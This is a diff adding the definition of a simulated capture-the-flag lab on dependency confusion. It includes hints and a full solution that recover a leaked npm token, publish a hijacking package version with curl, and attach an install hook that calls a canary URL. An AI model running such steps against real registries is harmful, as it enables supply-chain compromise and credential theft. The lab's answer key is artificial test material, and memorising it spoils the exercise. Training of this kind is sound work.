@@ -1,0 +1,90 @@
+apiVersion: openrange.io/v1
+kind: Room
+metadata:
+  slug: dependency-confusion-lab
+  title: 'Dependency Confusion Lab'
+  version: 1.0.0
+  difficulty: medium
+  points: 250
+  estimated_minutes: 50
+  tags: [supply-chain, dependency-confusion, package-registry, ci-cd]
+spec:
+  track: defense-cloud
+  type: challenge
+  summary: >-
+    An engineering org names its internal helper package company-utils,
+    never reserves that name upstream, and ships CI artifacts that bundle
+    maintainer credentials. You play the attacker in a contained lab: read
+    the public registry entry, recover the leaked auth token from the
+    stored artifact, claim a higher version through the publish endpoint,
+    and land an install hook the server-side installer will execute against
+    the lab canary. A confirmed takeover earns the flag.
+  objectives:
+    - 'Explain how unclaimed internal package names let public versions outrank private ones.'
+    - 'Recover a maintainer token from a leaked CI artifact in npmrc form.'
+    - 'Publish a hostile higher version whose install hook trips the lab canary.'
+    - 'Verify the server-side install ran your hook and capture the flag.'
+  prerequisites: []
+  scope:
+    allowed_targets:
+      - 'http://target:8000'
+    forbidden: [control-plane, other-labs, internet, host]
+  safety:
+    simulated_only: true
+    no_real_malware: true
+    reviewer_notes: 'The registry is a Flask simulation. Submitted install scripts are parsed as strings and never executed; the app itself records the event and writes the canary file when the script references the documented lab canary URL. No outbound traffic leaves the container and no real packages or tokens exist in the bundle.'
+  target:
+    build_context: ./target
+    ports: [8000]
+    healthcheck:
+      http_path: /healthz
+    flag_delivery: env
+    flag_env: ROOM_FLAG
+  workstation: terminal
+  tasks:
+    - id: claim-the-namespace
+      title: 'Squat company-utils and prove the takeover'
+      prompt: >-
+        Inspect the public registry copy of company-utils at
+        /registry/company-utils, recover the maintainer token from the
+        leaked CI artifact at /evidence/ci-artifacts.npmrc, then POST a
+        publish claim for a version above 1.0.0 carrying an install hook
+        that pings the documented lab canary URL. Confirm the server-side
+        install fired the canary via /takeover-check and collect the flag.
+      points: 250
+      hints:
+        - cost: 0
+          text: 'The registry page documents the publish contract: a JSON body with name, version, token, and install fields. Any semver above 1.0.0 outranks the public copy because this resolver prefers the highest version.'
+        - cost: 10
+          text: 'CI systems snapshot config files into artifact archives. Grab /evidence/ci-artifacts.npmrc; the _authToken line holds exactly the token value the publish endpoint wants.'
+        - cost: 25
+          text: 'POST /publish with JSON body {"name":"company-utils","version":"2.0.0","token":"npm_...from the npmrc","install":"curl -s http://canary.company.internal/beacon?pkg=company-utils"}. When it answers accepted, GET /takeover-check prints the flag.'
+      solution: |
+        1. Open http://target:8000/ and read the lab briefing. Follow the
+           link to /registry/company-utils. Note the latest version 1.0.0
+           and that this lab's resolver always installs the highest listed
+           version with its declared install hook.
+        2. Read the publish contract on the same page: POST /publish takes
+           JSON with name, version, token, and install. The install field
+           is the hook string the server-side installer would run, and the
+           lab requires every hook to reference
+           http://canary.company.internal/beacon?pkg=company-utils so the
+           canary can attribute the execution.
+        3. Collect the credential. GET /evidence/ci-artifacts.npmrc mimics
+           an archived CI artifact folder and contains
+           //registry.company.internal/:_authToken=npm_d2ef234f04b0272293cd64e033568dee.
+           That is the maintainer token.
+        4. Publish the confusing version:
+           curl -X POST http://target:8000/publish -H 'Content-Type: application/json'
+             -d '{"name":"company-utils","version":"2.0.0","token":"npm_d2ef234f04b0272293cd64e033568dee","install":"curl -s http://canary.company.internal/beacon?pkg=company-utils"}'
+           The registry answers accepted:true and simulates the install:
+           it records the hook and writes the canary marker.
+        5. Verify the takeover: GET /takeover-check confirms the canary
+           record for company-utils@2.0.0 exists and prints FLAG{...}.
+           Submit it.
+        6. Defensive reading: the fix is reserving internal names on every
+           public registry, scoping tokens to publish-only with short
+           expiry, and keeping credentials out of artifact archives. None
+           of that happened here, which is why one POST was enough.
+      validator:
+        type: per_session_flag
